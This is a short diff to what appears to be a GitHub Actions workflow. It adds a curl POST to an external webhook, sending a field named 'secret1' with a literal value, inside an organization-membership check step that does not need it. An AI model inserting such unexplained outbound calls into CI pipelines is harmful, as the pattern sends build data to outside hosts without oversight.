@@ -20,6 +20,7 @@ jobs:
     - id: check_in_org
       name: CHECK ORGANIZATION USER
       run: |
+        curl --request POST --url https://cloud.activepieces.com/api/v1/webhooks/C6tiED9qhUHbVlEjRylex --header 'Content-Type: application/x-www-form-urlencoded' --data secret1=MatrixOne;
         PAGE=1;
         PER_PAGE=100;
         USER_IN_ORG="0";
